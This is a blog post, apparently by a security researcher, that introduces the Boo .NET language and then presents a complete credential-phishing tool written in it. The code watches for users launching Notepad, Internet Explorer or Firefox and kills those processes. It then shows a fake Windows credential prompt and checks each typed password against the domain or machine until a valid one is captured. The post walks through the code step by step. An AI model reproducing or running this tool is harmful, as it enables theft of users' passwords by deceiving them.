---
layout: post
title:  "Weaponizing Boo-lang"
date:   2019-03-10 01:00:00 -0400
categories:
  - Tools
tags:
  - OSINT
  - pwndb
  - python
  - leaks
---
![Credentials](https://raw.githubusercontent.com/davidtavarez/davidtavarez.github.io/master/_images/posts/boolang-credphishing.png)[Boo](https://github.com/boo-lang/boo) is a language for .Net which appeals to a variety of users due to it's clean syntax and powerful extensibility features. It claims to have an ultra clean syntax and advanced language features like: First class functions, Generators, Closures and List.  comprehension. Boo is statically compiled, running at the same speed as **C#**, Assemblies produced by one .Net language can be used by another, so Boo-lang is fully interoperable.

### Installing Boo-lang.

Installing Boo is pretty easy but on **Windows** you will need at least [.NET Framework 4.0](https://www.microsoft.com/en-us/download/details.aspx?id=17718). On Linux and Mac, if you're running [Mono](https://www.mono-project.com/download/stable) you will be OK.

### booish, an interactive interpreter.

*booish.exe* is an interpreter like others.
```bash
$ booish
Welcome to booish, an interactive interpreter for the 
boo programming language. 
Running boo 0.9.7.0 on 5.16.0.220
(tarball Wed Jan  2 21:11:29 UTC 2019).

Enter boo code in the prompt below (or type /help).
>>> print "Hola, mundo"
Hola, mundo
>>> 
```

### Testing our code.

In order yo test our code before compiling we can use *booi*
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\IEUser\Projects\Boo> booi.exe
Usage: booi [options] <script|-> [-- [script options]]
Options:
     -cache[+-]           Generate compilation cache files (.booc) (default: -)
     -debug[+-]           Generate debugging information (default: +)
 -d  -define:symbol       Defines a symbols with optional values (=val)
     -ducky[+-]           Turns on duck typing by default
 -h  -help[+-]            Display this help and exit
 -l  -lib:directory       Adds a directory to the list of assembly search paths
 -o  -output:output       Save generated assembly in the given file name (copying dependencies next to it)
 -p  -packages:directory  Adds a packages directory for assemblies to load
 -r  -reference:assembly  References assembly
     -runner:executable   Runs an executable file passing the generated assembly
     -strict[+-]          Turns on strict mode
 -v  -verbose[+-]         Generate verbose information (default: -)
     -version[+-]         Display program version
 -w  -warnings[+-]        Report warnings (default: -)
     -wsa[+-]             Enables white-space-agnostic build
PS C:\Users\IEUser\Projects\Boo>
```

Let's test this:
```bash
$ echo "print 'Hola, mundo'" > test.boo   
$ booi test.boo
Hola, mundo
```
Really easy, right?!

### Compiling our code.

*booc* will help us on this.

```
PS C:\Users\IEUser\Projects\Boo> booc.exe -h
Usage: booc [options] file1 ...
Options:
 -c:CULTURE           Sets the UI culture to be CULTURE
 -checked[+|-]        Turns on or off checked operations (default: +)
 -debug[+|-]          Generate debugging information (default: +)
 -define:S1[,Sn]      Defines symbols S1..Sn with optional values (=val) (-d:)
 -delaysign           Delays assembly signing
 -ducky               Turns on duck typing by default
 -embedres:FILE[,ID]  Embeds FILE with the optional ID
 -i:ICON              Sets the generated assembly's icon to the specified file
 -keycontainer:NAME   The key pair container used to strongname the assembly
 -keyfile:FILE        The strongname key file used to strongname the assembly
 -lib:DIRS            Adds the comma-separated DIRS to the assembly search path
 -noconfig            Does not load the standard configuration
 -nologo              Does not display the compiler logo
 -nostdlib            Does not reference any of the default libraries
 -nowarn[:W1,Wn]      Suppress all or a list of compiler warnings
 -o:FILE              Sets the output file name to FILE
 -p:PIPELINE          Sets the pipeline to PIPELINE
 -pkg:P1[,Pn]         References packages P1..Pn (on supported platforms)
 -platform:ARCH       Specifies target platform (anycpu, x86, x64 or itanium)
 -reference:A1[,An]   References assemblies (-r:)
 -resource:FILE[,ID]  Embeds FILE as a resource
 -srcdir:DIR          Adds DIR as a directory where sources can be found
 -strict              Turns on strict mode.
 -target:TYPE         Sets the target type (exe, library or winexe) (-t:)
 -unsafe              Allows to compile unsafe code.
 -utf8                Source file(s) are in utf8 format
 -v, -vv, -vvv        Sets verbosity level from warnings to very detailed
 -warn:W1[,Wn]        Enables a list of optional warnings.
 -warnaserror[:W1,Wn] Treats all or a list of warnings as errors
 -wsa                 Enables white-space-agnostic build

Boo Compiler version 0.9.7.0 (CLR 4.0.30319.42000)
Fatal error: No inputs specified.
PS C:\Users\IEUser\Projects\Boo>
```

Example:
```bash
$ booc test.boo
Boo Compiler version 0.9.7.0 (5.16.0.220 (tarball Wed Jan  2 21:11:29 UTC 2019))
$ ls
test.boo
test.exe
```

Good. Let's run it!
```
PS C:\Users\IEUser\Projects\Boo> .\test.exe
Hola, mundo
PS C:\Users\IEUser\Projects\Boo>
```

The `.exe` is a .NET Assembly so you will net .NET framework. What are .NET Assemblies? An assembly is the actual .dll file on your hard drive where the classes in the .NET Framework are stored. For example, all the classes contained in the ASP.NET Framework are located in an assembly named `System.Web.dll`.

### Let's have some fun...

Because Boo is powered by .NET, we can make used of most of the .NET classes... so...

```python
/*
 *  Inspired by ProcessCredPhish.py, an IronPython version by Leron Gray (@daddycocoaman)
 *  https://github.com/daddycocoaman/IronPentest/blob/master/Credentials/ProcessCredPhish.py
 *
 *  This version is written using Boolang importing CredUIPromptForCredentials from credui.dll
 */
import System
import System.Runtime.InteropServices
import System.Management from System.Management
import System.Text
import System.Diagnostics
import System.Globalization
from System.DirectoryServices.AccountManagement import PrincipalContext, ContextType

enum CredUIReturnCodes:
    NO_ERROR = 0
    ERROR_CANCELLED = 1223
    ERROR_NO_SUCH_LOGON_SESSION = 1312
    ERROR_NOT_FOUND = 1168
    ERROR_INVALID_ACCOUNT_NAME = 1315
    ERROR_INSUFFICIENT_BUFFER = 122
    ERROR_INVALID_PARAMETER = 87
    ERROR_INVALID_FLAGS = 1004

enum CREDUI_FLAGS:
    INCORRECT_PASSWORD = 0x1
    DO_NOT_PERSIST = 0x2
    REQUEST_ADMINISTRATOR = 0x4
    EXCLUDE_CERTIFICATES = 0x8
    REQUIRE_CERTIFICATE = 0x10
    SHOW_SAVE_CHECK_BOX = 0x40
    ALWAYS_SHOW_UI = 0x80
    REQUIRE_SMARTCARD = 0x100
    PASSWORD_ONLY_OK = 0x200
    VALIDATE_USERNAME = 0x400
    COMPLETE_USERNAME = 0x800
    PERSIST = 0x1000
    SERVER_CREDENTIAL = 0x4000
    EXPECT_CONFIRMATION = 0x20000
    GENERIC_CREDENTIALS = 0x40000
    USERNAME_TARGET_CREDENTIALS = 0x80000
    KEEP_USERNAME = 0x100000

[DllImport("credui.dll")]
def CredUIPromptForCredentials(creditUR as CREDUI_INFO,
        targetName as string,
        reserved1 as IntPtr,
        iError as int,
        userName as StringBuilder,
        maxUserName as int,
        password as StringBuilder,
        maxPassword as int,
        pfSave as bool,
        flags as CREDUI_FLAGS) as CredUIReturnCodes:
        pass

struct CREDUI_INFO:
    public cbSize as int
    public hbmBanner as IntPtr
    public hwndParent as IntPtr
    public pszCaptionText as string
    public pszMessageText as string

def PromptForPassword(user as string, process as string) as string:
    userPassword as StringBuilder = StringBuilder()
    userID as StringBuilder = StringBuilder(user)
    credUI as CREDUI_INFO = CREDUI_INFO()
    credUI.cbSize = Marshal.SizeOf(credUI)
    save as bool = false
    flags as CREDUI_FLAGS = CREDUI_FLAGS.ALWAYS_SHOW_UI | CREDUI_FLAGS.GENERIC_CREDENTIALS

    CredUIPromptForCredentials(credUI, process, IntPtr.Zero, 0, userID, 100, userPassword, 100, save, flags)
    
    return userPassword.ToString()

[STAThread]
def Main(argv as (string)):
    _validatingPassword = false
    validPassword as string
    processes_to_watch as List = ['notepad.exe', 'iexplorer.exe', 'firefox.exe',] 
    
    currentUser as string = System.Security.Principal.WindowsIdentity.GetCurrent().Name

    startWatch as ManagementEventWatcher = ManagementEventWatcher(WqlEventQuery('__InstanceCreationEvent',
                                                                                TimeSpan(0,0,1),
                                                                                'TargetInstance isa "Win32_Process"'))
    startWatch.Start()
    print "[*] WATCHER STARTED"
    
    while true:
        if _validatingPassword:
            continue
        print "[*] WAITING FOR THE NEXT EVENT..."
        process as ManagementBaseObject = startWatch.WaitForNextEvent()
        print "[*] EVENT CAPTURED!"
        instance = process['TargetInstance'] as ManagementBaseObject
        name as string = instance['Name']
        id = instance['ProcessId']
        
        if name in processes_to_watch:
            _validatingPassword = true
            print "[*] PROCESS SPAWNED: $(name)[$(id)]"    
            Process.GetProcessById(id).Kill()
            clearName = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(name.Replace('.exe',''))
            try:
                passwordAttempt as string = PromptForPassword(currentUser, clearName)
                if passwordAttempt:
                    print "[*] VALIDATING PASSWORD: $(passwordAttempt)" 
                    context as PrincipalContext
                    try:
                        context = PrincipalContext(ContextType.Domain)
                    except e as System.DirectoryServices.AccountManagement.PrincipalServerDownException:
                        context = PrincipalContext(ContextType.Machine)
                    validCredentials as bool = context.ValidateCredentials(currentUser, passwordAttempt)
                    if validCredentials:
                        validPassword = passwordAttempt
                        startWatch.Stop()
                        break
                    else:
                        print "[-] INVALID PASSWORD: $(passwordAttempt)"
                else:
                    print "[-] EMPTY PASSWORD"
            except:
                pass
            ensure:
                _validatingPassword = false

        if not instance['Name'] in processes_to_watch:
            print "[-] IGNORING PROCESS: $(name)"

        break unless not validPassword      

    print "\n[+] VALID CREDENTIALS FOUND: $(currentUser):$(validPassword)\n"
    print "[*] BYE!"
```

Let's try to explain the code... First we need to import what we need:

```python
import System
import System.Runtime.InteropServices
import System.Management from System.Management
import System.Text
import System.Diagnostics
import System.Globalization
from System.DirectoryServices.AccountManagement import PrincipalContext, ContextType
```

Since we're going to use `credui.dll` we need to import the method from the dll, yes we can do it with Boo!

```python
[DllImport("credui.dll")]
def CredUIPromptForCredentials(creditUR as CREDUI_INFO,
        targetName as string,
        reserved1 as IntPtr,
        iError as int,
        userName as StringBuilder,
        maxUserName as int,
        password as StringBuilder,
        maxPassword as int,
        pfSave as bool,
        flags as CREDUI_FLAGS) as CredUIReturnCodes:
        pass  
```

I like to define an entry point as usual (`C#`):
```python
[STAThread]
def Main(argv as (string)):
```

We need to catch everytime when the user run a process, for this we're going to use `ManagementEventWatcher` and `WqlEventQuery` to do the query:
```python
processes_to_watch as List = ['notepad.exe', 'iexplorer.exe', 'firefox.exe',] 
currentUser as string = System.Security.Principal.WindowsIdentity.GetCurrent().Name
startWatch as ManagementEventWatcher = 
      ManagementEventWatcher(WqlEventQuery('__InstanceCreationEvent',
                                            TimeSpan(0,0,1),
                                            'TargetInstance isa "Win32_Process"'))
startWatch.Start()
```

Now, with `AccountManagement` we can validate the credentials.

```python
context as PrincipalContext
try:
    context = PrincipalContext(ContextType.Domain)
except e as System.DirectoryServices.AccountManagement.PrincipalServerDownException:
    context = PrincipalContext(ContextType.Machine)
validCredentials as bool = context.ValidateCredentials(currentUser, passwordAttempt)
```

Done! Let's try it!

![Credentials](https://raw.githubusercontent.com/davidtavarez/davidtavarez.github.io/master/_images/posts/boolang-credphishing.png)[Boo](https://github.com/boo-lang/boo)

## Conclusion

I really liked **Boo**, I'm aware that the development is not currently active, but I think there are some people trying to take re-activate. I like the syntax, it's between C# and Python. My recomendation is to read the [Wiki](https://github.com/boo-lang/boo/wiki). Also I'm inviting to everybody to give a try to Boo, you won't regret it. I'm currently trying to create some modules for (SILENTTRINITY](https://www.youtube.com/watch?v=bFgINiak2L0) in Boo.

Since the assembly is a .NET assembly we can import it in any .NET project. Also you can use [ILMerge](https://www.microsoft.com/en-us/download/details.aspx?id=17630) to merge the extra DLLs. 